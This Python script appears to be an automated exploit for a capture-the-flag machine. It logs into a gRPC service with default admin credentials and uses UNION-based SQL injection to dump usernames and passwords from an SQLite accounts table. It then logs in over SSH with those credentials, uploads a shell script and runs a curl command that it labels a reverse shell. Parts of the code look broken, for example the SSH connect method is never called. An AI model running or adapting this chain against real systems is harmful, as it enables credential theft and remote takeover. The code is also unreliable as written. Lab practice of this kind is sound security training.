import grpc
import SimpleApp_pb2_grpc as pb2_grpc
import SimpleApp_pb2 as pb2
import paramiko
import json
import sys


class AutoExploit(object):
    def __init__(self):
        self.host = "10.10.11.214"
        self.grpc_port = 50051
        self.stub = self._setup_grpc()
        self.token = self._get_token()
        self.users = self._get_users()
        self.ssh_client = SSHClient(self.users)

    def get_user_flag(self):
        print("Getting user flag")
        print(f"User flag: {self.ssh_client.exec_command('cat user.txt')}")

    def get_root_flag(self):
        self.ssh_client.transfer_file_from_local()
        self._exec_curl_command()

    def _get_users(self) -> dict:
        print("Getting users")

        query = "62 UNION SELECT name FROM sqlite_master where type='table'"
        table = self._sql_injection_request(query)

        query = f"62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info('{table}')"
        cols = self._sql_injection_request(query)

        res = []
        for col in cols.split(","):
            query = f"62 UNION SELECT GROUP_CONCAT({col}) FROM accounts"
            r = self._sql_injection_request(query)
            res.append(r.split(","))

        usernames = res[0]
        passwords = res[1]

        users = []
        for i in range(len(usernames)):
            users.append({"username": usernames[i], "password": passwords[i]})

        print("Users found")
        print(json.dumps(users))

        return users

    def _sql_injection_request(self, query):
        metadata = (("token", self.token),)
        id_request = pb2.getInfoRequest(id=query)
        r = self.stub.getInfo.with_call(id_request, metadata=metadata)
        return r[0].message

    def _setup_grpc(self):
        channel = grpc.insecure_channel(f"{self.host}:{self.grpc_port}")
        stub = pb2_grpc.SimpleAppStub(channel)

        return stub

    def _get_token(self):
        user = pb2.LoginUserRequest(username="admin", password="admin")
        _, call = self.stub.LoginUser.with_call(user)
        metadata = call.trailing_metadata()
        token = metadata[0].value[2:-1]

        return token

    def _exec_curl_command(self):
        print("Executing curl for reverse shell")

        with open("../curl.txt") as f:
            command = f.read().strip()

        self.ssh_client.exec_command(command)


class SSHClient(object):
    def __init__(self, users):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.users = users
        self.host = "10.10.11.214"

    def connect(self):
        for user in self.users:
            if user["username"] == "admin":
                continue

            try:
                self.client.connect(self.host, username=user["username"], password=user["password"])

            except paramiko.ssh_exception.AuthenticationException:
                print("Could not login using given credentials")
                sys.exit(1)

    def exec_command(self, command):
        ssh_stdin, ssh_stdout, ssh_stderr = self.client.exec_command(command)
        self.client.close()

        return ssh_stdout.read().decode("utf-8")

    def transfer_file_from_local(self):
        ftp_client = self.client.open_sftp()
        ftp_client.put("shell.sh", "/home/sau/shell.sh")


if __name__ == "__main__":
    auto_expoit = AutoExploit()
    auto_expoit.get_user_flag()
    auto_expoit.get_root_flag()
